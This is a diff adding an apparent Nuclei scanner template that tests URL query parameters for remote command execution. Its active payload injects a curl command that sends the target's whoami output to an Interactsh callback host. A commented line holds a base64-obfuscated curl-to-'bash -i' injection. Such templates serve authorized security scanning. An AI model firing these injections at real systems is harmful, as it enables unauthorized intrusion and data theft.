@@ -1,0 +1,37 @@
+id: query-rce
+
+info:
+  name: Query - RCE
+  author: roninja
+  severity: critical
+  description: |
+    This template tests for URI Query Param RCE vulnerability by injecting payloads into Query Parameter and detecting interactions via Interactsh. -V iserv=your-interact-hostname
+  reference: https://app.hackinghub.io/hubs/interactive-rce
+  tags: rce, http, injection
+
+
+http:
+  - raw:
+      - | 
+        GET {{BaseURL}}$ HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      payload:
+        - ;curl${IFS}$(whoami).{{interactsh-url}};
+          #- include known payload here
+          #- ;`echo${IFS}{{base64("curl${IFS}$(hostname${IFS}-i).{{iserv}}")}}|base64${IFS}-d|bash${IFS}-i`
+        
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{payload}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
